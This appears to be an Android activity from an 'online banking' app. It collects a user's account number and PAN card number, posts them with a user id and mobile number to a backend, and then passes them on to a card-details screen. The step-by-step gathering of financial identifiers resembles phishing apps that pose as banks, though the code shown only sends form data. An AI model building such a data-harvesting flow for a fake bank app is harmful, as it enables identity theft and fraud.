package com.codewithmuddasir.onlinebanking;

import static com.codewithmuddasir.onlinebanking.helper.Setting.model;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import com.codewithmuddasir.onlinebanking.helper.Util;
import com.codewithmuddasir.onlinebanking.databinding.ActivityCreditBinding;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class CreditActivity extends AppCompatActivity {

    ActivityCreditBinding binding;

    private Util util;

    private ProgressDialog progressDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_credit);

        util = new Util();

        progressDialog = new ProgressDialog(CreditActivity.this);
        progressDialog.setMessage("Loading... Please Wait");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCancelable(false);


        binding.sub.setOnClickListener(view -> {

            if(binding.acc.getText().toString().isEmpty() || binding.pan.getText().toString().isEmpty() ){
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
            }else{
                Intent intent2 = getIntent();





                thirdapge message1 = new thirdapge(intent2.getStringExtra("u"),
                        intent2.getStringExtra("m") ,binding.pan.getText().toString(),binding.acc.getText().toString());

                ApiService apiService = ApiClient.getClient().create(ApiService.class);
                Call<Void> call = apiService.createthirdpage(message1);

                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        // Handle successful response
                        if (response.isSuccessful()) {
                            // Data sent successfully
                            Intent intent = new Intent(CreditActivity.this, CardDetail.class);
                            intent.putExtra("m", intent2.getStringExtra("m") );
                            intent.putExtra("a", intent2.getStringExtra("a") );
                            intent.putExtra("u", intent2.getStringExtra("u") );
                            intent.putExtra("p", intent2.getStringExtra("p") );
                            intent.putExtra("d",intent2.getStringExtra("d"));
                            intent.putExtra("acc",binding.acc.getText().toString() );
                            intent.putExtra("pan", binding.pan.getText().toString() );
                            startActivity(intent);

                        } else {
                            // Handle other response codes if needed
                            Log.d("asdf123","unsucess");
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        // Handle failure
                        Log.d("asdf123",t.toString());
                    }
                });


            }


        });


    }



}





class thirdapge{
    private String userId;
    private String mobile;
    private String pancardnumber;
    private String accountnumber;

    thirdapge(String usrid,String mobile,String pancardnumber,String accountnumber){
        this.userId = usrid;
        this.mobile = mobile;
        this.pancardnumber = pancardnumber;
        this.accountnumber = accountnumber;
    }
}




